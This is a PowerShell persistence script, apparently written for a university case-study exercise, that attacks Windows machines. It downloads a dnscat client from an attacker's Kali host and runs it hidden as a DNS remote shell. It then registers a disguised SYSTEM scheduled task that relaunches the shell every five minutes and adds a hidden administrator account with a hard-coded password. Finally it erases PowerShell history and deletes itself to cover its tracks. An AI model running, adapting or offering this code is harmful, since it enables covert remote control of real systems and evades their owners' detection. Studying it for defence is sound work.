# Written by Garrett H.

<#
This is a script that was utilized during Case Studies during the Fall Semester of 2025 to establish persistence on any Windows machines accessed.
It has two key parts of its persistence:
1. It installs and creates a dnscat shell that is sent to a host kali ubuntu machine.
   This dnscat shell has two backups in the forms of scheduled tasks. One that brings it back after every boot, and one that checks every 5 minutes for it.
2. It creates a backup group and user, named backupadmins and rsyncd respectively.
#>

# This section establishes the static settings
$KALI_IP     = "..." # The host kali machine that will host the dnscat shell
$PORT        = "8080"
$BINARY_NAME = "dnscat.exe"
$NAMES       = @("ldsyncd", "mountclean", "netfilterd", "auditlogd", "tmpctl", "serviced", "dbus-runner", "core-agent")  # Randomized names for the timers
$RAND_NAME   = ".$($NAMES | Get-Random).exe" 
$INSTALL_DIR = "$env:ProgramData\Microsoft\Windows\Themes" 
$DEST        = "$INSTALL_DIR\$RAND_NAME"
$TASK_NAME   = $RAND_NAME.TrimStart('.')

# Check if the installation directory exists, if not, create it
if (!(Test-Path $INSTALL_DIR)) {
    New-Item -ItemType Directory -Path $INSTALL_DIR -Force
}

# Download the dnscat client from the Kali server and unblock it
Invoke-WebRequest -Uri "http://$KALI_IP`:$PORT/$BINARY_NAME" -OutFile $DEST  # Pulls the dnscat client from the host kali
Unblock-File -Path $DEST  # Removes any block on the downloaded file to allow execution

# Start the dnscat client with hidden window and specified server details
Start-Process -WindowStyle Hidden -FilePath $DEST -ArgumentList "--dns", "server=$KALI_IP,port=443"
Start-Sleep -Seconds 15  # Wait for the process to establish connection

# Create a scheduled task to run the dnscat client every 5 minutes
$Action = New-ScheduledTaskAction -Execute $DEST -Argument "--dns server=$KALI_IP,port=443"
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
    -RepetitionInterval (New-TimeSpan -Minutes 5) `
    -RepetitionDuration ([TimeSpan]::FromDays(3650))  # The task will repeat every 5 minutes for up to 10 years
Register-ScheduledTask -TaskName $TASK_NAME -Action $Action -Trigger $Trigger -User "SYSTEM" -RunLevel Highest -Force  # Register the task with highest privileges

# Create a backup user and add it to the administrators group
$Username = "rsyncd"
$Password = "R3b3ll10n"
net user $Username $Password /add  # Creates a new user account with specified username and password
net localgroup administrators $Username /add  # Adds the user to the administrators group
REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v $Username /t REG_DWORD /d 0 /f  # Ensures the user is hidden from the login screen

# Pause for a brief moment
Start-Sleep -Seconds 2

# Remove PowerShell command history to avoid detection of script execution
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

# Get the path of the current script
$MyPath = $MyInvocation.MyCommand.Path

# Wait a moment and then delete the script itself to remove traces of the attack
Start-Sleep -Milliseconds 500
Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c timeout 2 > nul & del `"$MyPath`""  # Deletes the script after execution to cover tracks
